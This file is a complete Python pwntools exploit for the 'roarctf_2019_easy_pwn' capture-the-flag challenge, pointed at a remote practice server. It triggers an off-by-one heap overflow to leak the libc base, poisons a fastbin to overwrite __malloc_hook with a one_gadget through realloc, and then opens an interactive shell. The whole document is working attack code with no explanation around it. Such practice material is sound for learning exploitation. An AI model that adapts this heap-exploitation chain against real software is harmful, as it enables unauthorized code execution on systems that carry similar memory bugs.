from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('roarctf_2019_easy_pwn')
io = remote('node4.buuoj.cn', 28715)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('roarctf_2019_easy_pwn')


def add(size):
	io.sendlineafter('choice: ', '1')
	io.sendlineafter('size: ', str(size))


def edit(index, size, content):
	io.sendlineafter('choice: ', '2')
	io.sendlineafter('index: ', str(index))
	io.sendlineafter('size: ', str(size))
	io.sendafter('content: ', content)


def delete(index):
	io.sendlineafter('choice: ', '3')
	io.sendlineafter('index: ', str(index))


def show(index):
	io.sendlineafter('choice: ', '4')
	io.sendlineafter('index: ', str(index))
	io.recvuntil('content: ')


def leak_libc():
	global libc_base
	add(0x18)									# chunk0 0x20
	add(0x18)									# chunk1 0x20
	add(0x68)									# chunk2 0x70
	add(0x18)									# chunk3 0x20
	edit(0, 0x18 + 10, b'a' * 0x18 + p8(0x91))	# overwrite chunk1 size
	delete(1)									# fake_chunk1 into unsorted_bin
	add(0x18)									# get chunk1 back and leave chunk2 in smallbin
	show(2)										# leak libc_base
	libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - 0x3c4b78
	log.success('libc_base: ' + hex(libc_base))


def pwn():
	__malloc_hook = libc_base + libc.symbols['__malloc_hook']
	realloc = libc_base + libc.symbols['realloc']
	one_gadget = libc_base + 0xf1147
	# one_gadget = libc_base + 0xf1247			# for local
	add(0x68)									# chunk4 0x70 (old chunk2)
	delete(4)									# put chunk2 into fastbin
	edit(2, 8, p64(__malloc_hook - 0x23))		# fake_chunk into fastbin	
	add(0x68)									# chunk4 0x70 (old chunk2)
	add(0x68)									# chunk5 0x70 (fake_chunk)
	edit(5, 0x1b, b'a' * 0xb + p64(one_gadget) + p64(realloc + 4))
	# gdb.attach(io)
	# pause()	
	add(0x100)
	io.interactive()


if __name__ == '__main__':
	leak_libc()
	pwn()
